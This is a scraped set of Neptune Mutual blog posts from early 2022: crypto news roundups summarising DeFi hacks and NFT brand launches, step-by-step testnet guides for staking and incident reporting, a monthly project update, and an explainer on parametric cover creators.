Ola Finance.</p><p>Inverse Finance, a stable coin protocol that focuses on capital efficient yield generation, was victimised by a multi-million dollar exploit, allowing the hacker to withdraw assets worth $15 million in ETH, WBTC, and YFI, among other currencies. According to multiple reports, the hacker deposited 901 Ethereum into the protocol and then used an oracle manipulation bug to manipulate the price of Inverse's INV token, allowing him to borrow assets and drain the protocol.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Visa has announced the launch of the \"Visa Creator Program,\" a one-year product planning and mentorship program for entrepreneurs in the arts, music, fashion, and cinema who want to use NFTs to grow their business. The new effort intends to assist a global cohort of digital creators interested in growing their businesses with digital collectibles by equipping them with knowledge of blockchain, NFTs, and Web3 technology.</p><p>The biggest NFT marketplace, OpenSea, has announced that the Solana blockchain will be integrated into its platform in the upcoming April integration. OpenSea will be the first NFT platform to allow the buying and selling of Solana and Ethereum-based NFTs. This is a long-awaited shift that industry experts believe reflects a positive sentiment for the wider NFT market, as well as reciprocal benefits across both ecosystems.</p><p>Liverpool Football Club has jumped onto the NFT bandwagon with the launch of the LFC Heroes Club collection on Polygon. The Legendary is a set of one-of-a-kind NFTs featuring 24 LFC men's team players that will be auctioned off, while the Hero limited edition NFTs will be priced at $75 and represent one LFC player or manager with distinct traits. Fans who purchase these NFT collections will gain exclusive access to an LFC community forum, holders-only experiences, virtual hang-outs, competitions, and LFC merch discounts, among many other things.</p><p>In other news, AS Monaco has become the first French Ligue 1 Club to debut on the NFT market. The sports team has partnered with Capital Block, an innovative NFT consultancy specialising in sports clubs, with the goal of developing a powerful community and outstanding fan experiences in the Metaverse.</p><p>Warner Bros is set to launch a digital collectible collection in partnership with Palm NFT Studio. One of the most well-known superheroes, Batman, will receive a massive NFT drop consisting of 200,000 unique Bat Cowl NFTs patterned on the renowned Batman mask, which will provide holders with exceptional perks. Bat Cowl NFTs will provide fans with unprecedented access to the DC Universe, as well as a two-year plan of utility, features, value, and other surprises.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<h2 id="partnerships">Partnerships</h2><p>Attracting investment from industry leaders is a vote of confidence in our team’s expertise and the project’s potential for growth. We have continued to add high-profile investors to our cap table and we are excited that during the month of March, XT.COM has joined our list of investors and will also be the first business partner to create a cover pool in the Neptune Mutual application.</p><h2 id="community-engagement">Community Engagement</h2><p>Our very active community has greatly helped us grow the size of our social media channels and also spread the word about our product release on the testnet. We were able to increase the size of our Twitter community to 30,000 followers, on Discord our community tripled to over 7,000 members, and in our Telegram channel, we added 6,000 new members to reach a total number of 17,000 Telegram users. We have been busy creating content on YouTube, creating product tutorial videos that explain to testnet users how to use our product’s features; to date, these have received more than 3,900 views. We have gained over 350 subscribers on our YouTube channel and we expect to grow this more over the coming weeks as we add more content. We have some exciting plans in store for our community for April and May, including the launch of an Ambassador program.</p><h2 id="recent-news">Recent News</h2><p>We launched a gamified version of our application on the Polygon Mumbai testnet, along with a leaderboard to track and reward the activity of participants. Access to the different features of the application has been granted progressively, week by week, and to date, over 15,000 users have actively participated in the testnet application. We released our final functionality, bond pools, yesterday, March 31, for all our users to access. As a community-centric protocol, we are proud of the extent to which our community has helped us achieve our milestones so far. We hope that we continue to receive community support in our journey of creating parametric cover policies.</p><h2 id="protocol-update">Protocol Update</h2><p>The development team adopted a number of recommendations made by testnet users to improve the platform UX. Security has always been our primary focus throughout our development process and we are very happy with how the testnet product has performed in this respect.</p><p>The transaction processing speed and reliability of the Ropsten network failed to meet our expectations in the first week of the launch. Thus, we decided to migrate the application to the Polygon Mumbai testnet, and since then we have seen a significant improvement in performance. Access to Incident Reporting and Policy Claims were launched on the Polygon testnet environment, much to our delight.</p><p>Our code base is open source, and you can look at the history of “commits” to our protocol, SDK, native website, and test net repositories on Github to see how busy and active our development team has been in implementing improvements over the last few weeks.</p><h2 id="team">Team</h2><p>Team meetups are not only fun, they help set a positive tone and foster a more collaborative environment — and we love them! Our most recent meetup took place in March and was organised for our Nepalese team.</p><p>We are looking to grow our team and we are actively recruiting for the following positions: Senior React Developer, Growth Strategist, Technical Project Manager, and Blockchain Developer. So if you are interested in any of these roles we’d love to hear from you, you can apply <a href="https://angel.co/company/neptune-mutual" rel="nofollow noopener noreferrer">here</a>.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Crypto enthusiasts, including investors, collectors, and users alike are optimistic about NFTs, seeing them as the next big thing in terms of future investment vehicles.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Veve, the NFT marketplace for licensed digital collectibles, was subjected to an exploit on March 22, resulting in the loss of a number of gems worth millions of dollars. According to early reports, the exploiters behind the attack were able to mint millions of gems without having to pay for them by exploiting a bug in the buying mechanism. The app-based NFT platform has disabled the marketplace as well as the option to purchase gems until the investigation is completed.</p><p>On the same day, the OneRing protocol was the victim of a flash loan attack, which netted the hacker $1.5 million. The exploit was made possible by the flash loan-assisted price manipulation of the LP tokens, resulting in a significant number of OShare tokens being transferred from the protocol.</p><p>In a spear-phishing attack, Arthur Cheong, the founder of venture capital firm DeFiance Capital, lost approximately 585 ETH worth of NFTs amounting to around $1.7 million. The hacker used a phishing email to install malware on his hardware device, extracting the seed phrase and storing it in his cryptocurrency wallet. Popular NFT collections such as 17 Azuki, 5 CloneX, 2 Hedgies, and 33 Second Self were among the stolen assets, which the hacker subsequently sold on platforms like OpenSea before moving the resulting tokens to a wallet controlled by them.</p><p>On March 23rd, an anonymous hacker used an infinite mint to cash out $48 million from Cashio. Cashio’s insufficient collateral validation system was at the heart of the infinite mint vulnerability on this Solana-native stablecoin protocol. This lets the hacker mint 2B $CASH by creating a fake root contract that is never validated, and then a chain of fake accounts that each pass validation checks because they are only compared to one another. A part of the funds was burned for LP tokens and the remaining were swapped for 8.6 million UST and 17 million USDC on SaberSwap, with the majority of the funds swapped for a bit more than 16,000 ETH, amounting to around $48 million remaining in this wallet.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Meta has filed eight trademark applications with the United States Patent and Trademark Office relating to blockchain technology and its proposed metaverse, after Mark Zuckerberg’s announcement last week. The applications and their fields of interest would cover almost every aspect of the Web3 metaverse, including online social networking and dating services, design and development of Web3-related computer hardware and software, such as gaming, e-commerce, blockchain transactions, and so on, entertainment, and electronic publishing services, partly in virtual reality, among other things.</p><p>Line, the Japanese messaging app, is set to launch its NFT marketplace on April 13th, allowing users to purchase digital tokens using the company’s social media and messaging app. With this development, Line hopes to create an environment in which anyone can easily access NFTs via its marketplace, as well as provide users with an entry point into Web 3.0.</p><p>David Beckham has become the latest sports figure to embrace blockchain, NFTs, and the Metaverse by becoming a global brand ambassador for the DigitalBits blockchain. He will also put out a series of NFTs, and other digital assets in an effort to create a new experience for the fans online. Another global football icon Zlatan Ibrahimović joined the ranks of other famous athletes with an NFT collection by releasing his first-ever NFT collection labeled The Laws of Adrenaline, on MakersPlace. An airdrop of one limited edition NFT would be made available for any collector who purchased at least one open edition in each of his first three drops.</p><p>Binance NFT will launch a one-of-a-kind collection in collaboration with Toni Kroos on March 31, 2022, with the support of NFKings. This collection will be based on Kroos’ career and history as a soccer player, highlighting unique plays and moments and will be distributed in the form of 6,500 mystery boxes, each containing a hidden art piece created by Ahmed Abokor. The release of the NFTs aims to provide new ways for the player to interact with his loyal fans through unique perks and rewards such as signed jerseys and memorabilia, all while contributing to a variety of charitable causes.</p><p>Floyd Mayweather, the boxing legend, is returning to the NFT space to launch an NFT brand called ‘Mayweverse,’ with 5,000 Mayweverse NFTs and, according to reports, a boxing gym in the metaverse. These are five different NFT cards, each with 1000 NFTs and varying rarity, utility, and prize levels.</p><p>Qantas, an Australian airline, announced the release of their NFT collection, which is scheduled for mid-2022, as well as the plan for an NFT drop to their frequent flyers. In addition to increased publicity, Qantas NFTs will award Qantas Points to their initial purchasers, which can be redeemed for flight tickets.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

We believe that blockchain projects thrive and achieve greater goals because of their communities.</p><p>It is our mission to bring together user communities and gather support for their favourite protocols by becoming liquidity providers.</p><p>That’s why we’re so excited to let you in on our latest features release tomorrow — <strong><strong>Thursday, March 24, 8 AM HKT.</strong></strong></p><p>Our new <strong><strong>Staking and POD Staking</strong></strong> features will focus on rewarding liquidity providers and token holders on the Neptune Mutual platform.</p><p>Read on to find out how each unique feature works and rewards liquidity providers.</p><h3 id="staking">Staking</h3><figure class="kg-card kg-embed-card"><iframe width="200" height="113" src="https://www.youtube.com/embed/5Vq2k2UanNc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="Video 6: Staking Pools"></iframe></figure><p>Staking NPM tokens is one of the most important features of the Neptune Mutual protocol. Neptune Mutual’s Staking feature intends to generate rewards for NPM token holders and liquidity providers.</p><p><strong><strong>Step 1: </strong></strong>To stake NPM tokens, go to <strong><strong>[Pool]</strong></strong> at the topmost portion of the homepage.</p><p><strong><strong>Step 2:</strong></strong> Go to the<strong><strong> [Staking]</strong></strong> tab.</p><p><strong><strong>Step 3:</strong></strong> Once there, choose the cover card you want to stake NPM tokens on.</p><p>On the cover card, you’ll find the cover’s:</p><ul><li><strong><strong>APR. </strong></strong>The annual percentage rate investors may earn from staking their NPM tokens after interest rates and other fees.</li><li><strong><strong>Lockup period. </strong></strong>This tells you how long your staked tokens will stay locked on the platform.</li><li><strong><strong>TVL.</strong></strong> Short for total value locked by the cover’s liquidity providers shown in US dollars.</li></ul><p><strong><strong>Take note: </strong></strong><em><em>On the testnet, the lockup period is set for 5 minutes to make testing more convenient. NPM tokens can’t be withdrawn during the lockup period.</em></em></p><p><strong>Okay, now back to staking…</strong></p><p>On the cover card, you’ll find the <strong><strong>[Stake]</strong></strong> button.</p><p><strong><strong>Step 4: </strong></strong>Click <strong><strong>[Stake]</strong></strong> to stake NPM tokens for the cover of your choice.</p><p><strong><strong>Step 5: </strong></strong>Enter how many NPM tokens you want to stake.</p><p><strong><strong>Step 6:</strong></strong> Click <strong><strong>[Approve NPM]</strong></strong>.</p><p><strong><strong>Step 7: </strong></strong>Confirm your stake from MetaMask until the platform approves it.</p><p><strong><strong>Step 8: </strong></strong>After that, click <strong><strong>[Stake]</strong></strong>.</p><p><strong><strong>Step 9:</strong></strong> Confirm the following MetaMask transaction to stake NPM.</p><p><strong>Rewards and Stake Withdrawal</strong></p><p>Find your share of staked NPM tokens and rewards generated on each of your active covers.</p><p><strong><strong>Step 1:</strong></strong> You can supply more NPM to your cover pools by clicking <strong><strong>[+]</strong></strong>.</p><p><strong><strong>Step 2: </strong></strong>Click <strong><strong>[Collect]</strong></strong> to withdraw your share.</p><p>You can harvest token rewards generated by clicking <strong><strong>[Collect]</strong></strong> under the Harvest tab.</p><p><strong><strong>Step 3:</strong></strong> Click <strong><strong>[Confirm]</strong></strong> from the MetaMask notification to complete the transaction.</p><p>Under the Withdraw section, you can fully or partially withdraw your staked NPM.</p><p><strong><strong>Step 4: </strong></strong>Enter the number of NPM tokens you want to withdraw.</p><p><strong><strong>Step 5: </strong></strong>Click <strong><strong>[Unstake]</strong></strong>.</p><p><strong><strong>Step 6: </strong></strong>Confirm the transaction request from MetaMask and wait until your stake withdrawal is successful.</p><h3 id="pod-staking">POD Staking</h3><figure class="kg-card kg-embed-card"><iframe width="200" height="113" src="https://www.youtube.com/embed/fMOSGCLNIco?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="Video 7: How to stake PODs"></iframe></figure><p>Cover creators can offer their project’s native tokens to attract and incentivize liquidity providers.</p><p>Liquidity providers will each receive an equivalent <strong><strong>Proof of Deposit (POD)</strong></strong> to their staked asset of stable cryptocurrency in DAI.</p><p>As a liquidity provider, you can stake PODs in the Neptune Mutual pool to earn greater returns called <strong><strong>Shield Mining Rewards</strong></strong>.</p><p><strong><strong>Step 1: </strong></strong>To stake your POD, go to the <strong><strong>[Pool]</strong></strong> tab at the topmost part of the homepage.</p><p><strong><strong>Step 2: </strong></strong>Next, go to the POD Staking section right beside Staking.</p><p>You’ll find the cover cards available you can supply liquidity to. Every cover will have its respective card to stake PODs.</p><p><strong><strong>Just like with staking…</strong></strong></p><p>You’ll find the cover’s APR, lockup period, and TVL on the cover card. Scroll back to the Staking section of this blog to review what these terms mean.</p><p><strong><strong>Note: </strong></strong><em><em>For the testnet, the same 5-minute modified lockup period with Staking will apply to POD Staking. Again, users can’t withdraw NPM tokens during the lockup period.</em></em></p><p><strong><strong>Step 3: </strong></strong>Click <strong><strong>[Stake]</strong></strong> for the cover you want to stake PODs on.</p><p><strong><strong>Step 4:</strong></strong> Enter the amount of POD you want to stake.</p><p><strong><strong>Step 5: </strong></strong>Confirm the transaction request from MetaMask and wait until your POD stake gets approved.</p><h3 id="join-the-neptune-mutual-testnet">Join the Neptune Mutual Testnet</h3><p><a href="https://gleam.io/tPydn/npm-testnet-unlock-the-gold-vault" rel="nofollow noopener noreferrer">Register on Gleam</a> to join the NPM ‘Unlock the Gold Vault’ protocol testnet contest.

With the concept of blockchain technology seeping into the world consciousness as a powerful and important financial technology, NFTs could do substantially more than they have already.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>In a purported phishing assault, hackers took a collection of Rare Bears NFTs and other cryptocurrencies worth roughly $790,000. Rare Bears is an Ethereum-based NFT collection of 2,400 cartoon-themed bears by Enox, an esteemed New Zealand-based digital artist. The collection was released via a public mint last week.</p><p>Agave DAO and Hundred Finance were victims of the reentrancy attack, losing a total of $11.7 million in assets valued at about 2116 ETH for Agave and 2363 ETH for Hundred Finance. The attacks were conceivable because one of the xDAI token’s features was designed in such a way that it created a reentrancy vulnerability. The anonymous hacker layered several borrow methods inside one another, increasing the amount borrowed before the protocol could update the debt balance, repeating the practice of using flash loans as initial collateral.</p><p>Another flash loan attack saw Deus DAO users liquidated on the newly established DEI lending contract, resulting in a profit of about $3 million for the hacker. The hacker forced liquidation by tampering with the balance of the Solidex USDC/DEI pool, which is utilised as an oracle for collateral value on Deus Finance’s lending contract, causing user positions to become insolvent, before the flash loan was repaid.</p><h2 id="metaverse-and-nfts">Metaverse and NFTs</h2><p>Instagram is planning to introduce NFTs to its platform, according to Mark Zuckerberg, CEO of Meta. He didn’t say much about the digital collectibles’ purpose on the platform, but hinted that they may play a role in Meta’s own metaverse by allowing users to show off their existing NFTs, and even mint new ones.</p><p>Another tech behemoth is set to enter the NFT market, Spotify, in an attempt to fend off crypto startups trying to penetrate the blockchain music industry. The music streaming service is considering incorporating blockchain technology and non-fungible tokens into its platform, stoking interest in the cryptocurrency and music industry about the potential of NFTs to increase artists’ earnings.</p><p>Coinbase has announced that their NFT marketplace will be available very soon. According to a post on Twitter, the team recently met with over 100 creators and has been incorporating community feedback into the marketplace’s growth by integrating essential features and innovations that their competitors have yet to offer.</p><p>Metaverse and NFT technologies have grabbed American Express’s attention. According to the US Patent and Trademark Office, the world’s second-largest payment processor has recently filed trademarks for multiple products, including Amex, Centurion, and the Shop-mall program, with the goal of bringing travel, transportation, and entertainment services, as well as financial services and security to aid in fraud detection, all within the metaverse.</p><p>Rihanna is going to be yet another addition to the metaverse realm, joining the ranks of apparel brand Wrangler and footwear brand Skechers. The multi-award-winning singer and businesswoman registered a new patent to sell virtual cosmetics and hair care products under her Fenty beauty brand, according to the US trademark office.</p><p>MakeMyTrip has hopped on the NFT bandwagon, with the aim of fostering sustainable tourism in India. The Indian travel agency is believed to have jumped on the cryptocurrency bandwagon by releasing a limited-edition digital collection series of Indian landscapes and artwork from places across the country including Goa, Ladakh, Orissa, Himachal Pradesh, Kashmir, Kerala, Meghalaya, Rajasthan, and the Andaman Islands. The artwork, which starts at $195 for a single NFT, depicts not only the country’s most well-known tourist destinations but also a variety of lesser-known spots.</p><p>Levi Strauss &amp; Co., a denim company based in the United States, has submitted trademark applications related to NFTs and the metaverse. With aspirations to deliver multimedia backed by NFTs and online storefronts providing virtual apparel, footwear, and fashion accessories, the firm has filed three trademark applications for its name, logo, and 501 brands.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>A cover creator prioritises digital asset security and risk mitigation. They create cover pools to offer their user base and investor community a choice in the way they manage their exposure to risks associated with their platform.</p><p>Cybercrime, hacking, and exploits have been a common practice, resulting in large losses over the past few years.</p><p>The most vulnerable segment has been on-chain protocols. These projects often find themselves highly exposed to smart contract coding errors, loopholes, and vulnerabilities. If these risks are not adequately addressed projects may either <a href="https://blog.neptunemutual.com/financial-protection-of-digital-assets-covering-the-basics" rel="follow">not run as intended</a> or worse, render them <a href="https://blog.neptunemutual.com/defi-crime-data-review-and-tips-on-digital-asset-security" rel="follow">a victim of cybercriminal</a> activity. This can result in thousands and even millions of dollars in damages and loss. Not to mention the decrease of support and confidence in the project.</p><p>The frequency of incidents and the sum of assets stolen from DeFi protocols surpassed the damage from centralised crypto exchanges over 2021; depending on sources, the number is around 2B$ losses from DeFi vs 1B$ losses from CeFi. And so far traditional insurers have been reluctant to accept crypto service providers as clients. Leaving aside the difficulty of regulatory considerations, the level of understanding about DeFi and Web3 projects is extremely low amongst traditional underwriters. To make things worse, there is very limited historical data available for use by actuarial teams to work on pricing models. As a result, if there is little data on which to evaluate and price project or market risk, the options are limited to either refusing to take on the particular risk or charging a very high premium to mitigate the uncertainty.</p><p>Neptune Mutual is a new entrant into the space of financial protection of digital assets, and it is proposing a new approach that is designed to solve some of the structural problems faced by traditional underwriting models. Neptune Mutual offers a peer to peer marketplace whereby anyone can choose either to become an underwriter (aka liquidity provider) and earn premiums from this investment or to become a cover policyholder and benefit from the cover policy (underwritten by the liquidity providers) in the event of a validated hack or exploit.</p><p>For cover creators that create project-specific cover pools in this marketplace, there are numerous benefits over-and-above a traditional insurance model.</p><p>Firstly, the financial protection is specific to each project and so premiums and payouts are not affected by the risks associated with other projects.</p><p>Secondly, if an incident does arise, then as Neptune Mutual has adopted a parametric model, there is only the need to validate whether or not the incident has triggered all the parameters of the cover policy: this typically takes around 7 days following which either the incident is validated in which case all cover policyholders can claim a payout, or the incident is not validated in which case no policyholders can claim a payout. This system avoids the need for individual claims to be evaluated one by one.</p><p>The consequences of this are that Neptune Mutual cover policies will resolve financial claims within a matter of days after an incident, whereas the administration of evaluating hundreds or many thousands of individual claims could take weeks or months to complete for a traditional insurance solution after an incident.</p><p>With a Neptune Mutual cover solution in place, projects can build a closer relationship with their user and investor communities alike, and establish a protection mechanism that inspires confidence due to its ability to resolve incidents quickly and because of the guaranteed nature of payouts in the event of a validated incident.</p><p>So who exactly are and should be cover creators?</p><h2 id="who-are-cover-creators">Who are Cover Creators</h2><p>Cover creators are usually the owners/creators of CeFi platforms (ie crypto exchanges, crypto custodians, OTC trading platforms), DeFi or metaverse projects, digital asset managers, or, in fact, any team who is looking for a solution to safeguard their ecosystem and protect users of their product and services from hacks and exploits.</p><p>A cover creator creates a cover contract and specifies the parameters that define the risks being covered and the terms and conditions under which the policy will payout to policyholders.</p><p>In order for a cover policy to work successfully, a cover creator must think carefully about the parameters of the policy, the exclusions, and any pre-conditions that must be fulfilled in order for the policy to function effectively.</p><p>Cover creators need to burn 1000 NPM tokens and they will also need to stake 4000 NPM tokens or more. The higher the stake, the more visibility the cover pool will receive in the cover pool marketplace.</p><h2 id="cover-creation-best-practices">Cover Creation Best Practices</h2><p>To make cover policies appealing to a community, creators can follow these best practices when it comes to creating a cover on Neptune Mutual:</p><ul><li>Before a cover creator launches their cover pool on Neptune Mutual, it is recommended they create a proposal to list their project’s token on Neptune Mutual’s staking portal; this will help improve the project’s exposure to Neptune Mutual’s community. Through Neptune Mutual, a user who participates in a cover creator’s project can support the project’s development and success by providing liquidity and staking PODs (see below).</li><li>Specify clear and concise rules about how and when a cover incident occurs.</li><li>Work with the Neptune Mutual team to set floor and ceiling prices for the cover policy that correspond to the level of risks being underwritten.</li><li>Collaborate with the project community on promoting the cover pool.</li><li>Offer a reassurance fund to make the cover pool more attractive to liquidity providers. Following validation of an incident, a share of the reassurance fund is transferred to the liquidity pool to minimise liquidity providers’ losses.</li><li>Provide POD staking rewards to liquidity providers. This is a mechanism in which those who provide liquidity to the cover pool can choose to stake the special kind of ERC-20 token called PODs (Proof of Deposits) that they receive when they provide liquidity. Cover creators can choose to reward the POD holders (liquidity providers) with their project’s native token. This incentivises liquidity providers to join and collectively underwrite the security risk of the cover creators project.</li></ul><h2 id="conclusion">Conclusion</h2><p>Neptune Mutual parametric cover offers a new approach to CeFi, DeFi, and metaverse projects looking to provide financial protection to their ecosystem of digital asset owners. The system helps build confidence in the project because of the attributes of parametric cover that enable it to resolve incidents rapidly and provide guaranteed payouts to policyholders in the event that a hack or exploit is validated by the community.</p><p>Neptune Mutual cover helps to increase the resilience of digital assets and increase the confidence the community places in blockchain projects. <a href="https://blog.neptunemutual.com/parametric-cover-covering-the-basics" rel="follow">Parametric covers protect projects and their crowdfunding communities.</a></p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>Our protocol testnet launch just got a whole lot better! First of all, we’re transferring Neptune Mutual on the Polygon Testnet this Thursday, March 17, 2022, at 12 MN UTC. New features will be unlocked at the same time as well.</p><p>Yes, we heard you! Being a faster and more reliable network, we’re improving your testnet experience on the Polygon network. Our team worked really hard to get it online for you on the Polygon Testnet.</p><p>We’ve also bumped up the number of winners for the testnet competition to 100! Don’t miss your chance to be one of the 100 lucky winners, <a href="https://gleam.io/tPydn/npm-testnet-unlock-the-gold-vault" rel="nofollow noopener noreferrer">register to Unlock the Gold Vault.</a></p><p>In addition to these exciting announcements, we’ve also added new features to the Neptune Mutual testnet: Incident Reporting and Claiming Cover Policy Payouts.</p><p>Let’s get right into it!</p><h3 id="incident-reporting">Incident Reporting</h3><figure class="kg-card kg-embed-card"><iframe width="200" height="113" src="https://www.youtube.com/embed/THNoTAr-bOc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="Video 4: Reporting an Incident"></iframe></figure><p>An incident refers to a hack or exploit on a covered project that by nature of the incident meets the conditions specified by the parameters of the project’s cover pool policy. Anyone with sufficient NPM tokens can report an incident.</p><p>Let’s go over what happens when you report an incident on Neptune Mutual.</p><p><strong><strong>Step 1: </strong></strong>Select the project you want to make an incident report on.</p><p><strong><strong>Step 2: </strong></strong>Click [<strong><strong>Report Incident</strong></strong>].</p><p><strong><strong>Step 3: </strong></strong>Review the cover rules to find out if the incident meets the conditions specified by those rules. If it does, tick the checkbox and click [<strong><strong>Report an Incident</strong></strong>].</p><p><strong><strong>Step 4a: </strong></strong>If you are the First Reporter of the incident, you will be required to complete details about the incident namely:</p><ul><li>Incident title</li><li>Date and time of when the incident occurred</li><li>Proof that the reported incident has indeed occurred</li><li>Description of the incident</li></ul><p>After making your report, you will be asked to stake NPM tokens. The First Reporter will be required to stake a minimum amount of NPM tokens, depending on the cover.</p><p><strong><strong>Step 4b: </strong></strong>Other reporters that follow after will only need to stake just 1 NPM token.</p><p><strong><strong>Step 5: </strong></strong>After clicking [<strong><strong>Report</strong></strong>], the following details are submitted to open up the cover for governance. The reporting period for the specific incident begins.</p><p><strong><strong>Note:</strong></strong> <em><em>To make testing convenient, the reporting period on the testnet will only be 30 minutes. However, once we launch the mainnet, reporting periods may typically take 7 days.</em></em></p><p><strong><strong>Step 6: </strong></strong>Navigate to the Reporting tab to see the status of the incident report.</p><p>During the reporting period, community members will vote on the validity of the reported incident.</p><p>On the page, you will see insights on the reported incident along with the progress and status of the reported incident, and time left to vote on the particular incident.</p><h3 id="disputing-incidents">Disputing Incidents</h3><p>A Candidate Reporter is the first person to dispute the First Reporter’s incident report. As the Candidate Reporter, you can dispute the validity of an incident report as false reporting.</p><p><strong><strong>Step 1: </strong></strong>Click on [<strong><strong>Add Dispute</strong></strong>].</p><p><strong><strong>Step 2a: </strong></strong>Specify the details of your dispute similar to how you’d report an incident:</p><ul><li>Dispute title</li><li>Description of the dispute</li><li>Supporting information on the invalidity of the report and its inability to satisfy parametric cover rules</li></ul><p>Candidate reporters are required to stake a minimum amount of NPM tokens pre-determined by the cover creator.</p><p><strong><strong>Step 2b: </strong></strong>Other reporters that follow after will stake at least 1 NPM token to either vote to support or disagree with the reported incident.</p><p><strong><strong>Step 3: </strong></strong>Enter the amount you wish to stake.</p><p><strong><strong>Step 4: </strong></strong>Click [<strong><strong>Approve NPM</strong></strong>].</p><p><strong><strong>Step 5: </strong></strong>Click [<strong><strong>Report</strong></strong>] to confirm the transaction request from MetaMask and successfully submit your request.</p><h3 id="incident-resolution">Incident Resolution</h3><p>Incident reports get resolved at the end of the reporting period.</p><p>The project’s cover policy will compare votes from incident report supporters versus disputers. Honest reporters win while dishonest reporters will find their staked NPM tokens forfeited.</p><p>So, how are staked NPM tokens allocated?</p><ul><li>60% of staked NPM tokens from the dishonest reporters are rewarded to the honest reporters.</li><li>10% of staked NPM tokens from the dishonest reporters will be rewarded to the <strong><strong>Final Reporter</strong></strong>.</li><li>30% of staked NPM tokens from the dishonest reporters are burned.</li></ul><p>The primary motivation behind being the First Reporter comes from the benefit of getting rewarded 10% of staked NPM tokens from the dishonest reporters if the incident report is proven true.</p><p>On the other hand, the same motivation may apply to the Candidate Reporter when the incident report is proven false.</p><h3 id="simulating-incident-reports-on-the-testnet">Simulating Incident Reports on the Testnet</h3><p>When a cover policy goes into an incident reporting phase, no one will be able to take out a new cover policy.</p><p>If users decide to report incidents without reasonable cause, the consequence of this would be to prevent users from purchasing cover policies for the duration of the reporting period.</p><p>In the mainnet application, this will be discouraged by the need to stake tokens, however obviously these are free on the testnet so to avoid this problem, our team will publish real-time incidents for different covers in our Discord community. Incidents will occur at different times of the day and this approach will help us see how quickly users respond and report the incident.</p><p><strong>Users who report incidents without reasonable cause (i.e. reporting an incident before there is any incident information released in the Neptune Mutual Discord channel) will incur penalties — such as losing points in the leaderboard rankings.</strong></p><h3 id="claiming-a-cover-policy-payout">Claiming a Cover Policy Payout</h3><p>Once the community validates an incident report, cover policyholders may now claim their payout.</p><p>Let’s take a look at how you can claim a cover policy payout on Neptune Mutual.</p><p><strong><strong>Step 1: </strong></strong>Choose the cover you want to make a claim to.</p><p><strong><strong>Step 2: </strong></strong>Navigate to the [<strong><strong>Claim Cover</strong></strong>] tab. You will find the list of Active and Expired reports you have a cover from.</p><p>Covers with validated incident reports will have a cover card with a ‘<strong><strong>Claimable</strong></strong>’ status. A ‘<strong><strong>Reporting</strong></strong>’ status indicates that an incident has occurred for a particular cover yet it is still in its reporting period.</p><p>On the cover card, you will see your purchase amount for the particular policy. Also, you will find the <strong><strong>timeframe</strong></strong> for when your policy should be claimed. If the policy expires, you will be unable to make your claim.</p><p><strong><strong>Step 3: </strong></strong>Select the cover.</p><p>You will see your transaction details with information such as the <strong><strong>address</strong></strong> to validate your claim, the <strong><strong>amount of cxTokens</strong></strong> you will receive from the claim, and the <strong><strong>date</strong></strong> for when your claim expires.</p><p><strong><strong>Step 4: </strong></strong>Click [<strong><strong>Claim</strong></strong>].</p><p><strong><strong>Step 5: </strong></strong>Enter the amount of cxTokens you want to claim.</p><p><strong><strong>Note:</strong></strong> <em><em>A </em></em><strong><strong><em><em>transaction processing fee</em></em></strong></strong><em><em> will be deducted from your claim.</em></em></p><p><strong><strong>Step 6: </strong></strong>After you click [<strong><strong>Claim</strong></strong>], you can now <strong><strong>confirm</strong></strong> your transaction from the MetaMask notification window. And…</p><p>Ta-da! Your claim is a success.</p><h3 id="join-the-neptune-mutual-testnet">Join the Neptune Mutual Testnet</h3><p><a href="https://gleam.io/tPydn/npm-testnet-unlock-the-gold-vault" rel="nofollow noopener noreferrer">Register on Gleam</a> to join the NPM ‘Unlock the Gold Vault’ protocol testnet contest.

The development of the Metaverse has given rise to an entirely new digital economy, defined by virtual experiences and interactions, allowing us to explore our human imagination and develop new parallel universes where we can pick our own experiences.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Paraluni, a decentralised financial payment network was exploited in a series of transactions resulting in a loss of assets worth $1.7 million. The hack was caused due to a reentrancy bug in one of its functionalities, allowing the hacker to double the claimable credits. The initial funds to initiate the hack were taken from Tornado Cash, and the gains were swapped via PancakeSwap.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>The Sandbox, a subsidiary of Animoca Brands, announced its partnership with the NFT community World of Women to launch the WoW Foundation. The agreement will help fund the foundation’s efforts to introduce more women and diversity into the NFT and metaverse area over the next five years, including their plans to open a WoW Museum in The Sandbox’s online world and a WoW University that will offer instructional Web3 lessons.</p><p>A new dating app has piqued the curiosity of the Bored Ape Yacht Club. The Lonely Ape Dating Club, created by Year 4000 Labs, will aim for ways to incorporate cryptocurrency and web3 into the dating environment. The application will begin with BAYC NFT holders and contain features that allow users to connect their crypto-wallets and filter potential matches based on their net worth and the number of NFTs they own.</p><p>Behance, an Adobe-owned creative showcase platform announced that users may now link their Phantom wallets to their Behance accounts and display their Solana NFTs on their profiles. QuickNode, a Miami-based Web3 infrastructure platform, assisted in the development of this feature on Solana because of its low entry barrier and rising user concerns about excessive energy usage and gas costs on Ethereum networks.</p><p>LimeWire, a peer-to-peer file-sharing program from the early 2000s, has resurfaced after a decade as a digital collectible marketplace for art, music, and entertainment under the leadership of their new owners.

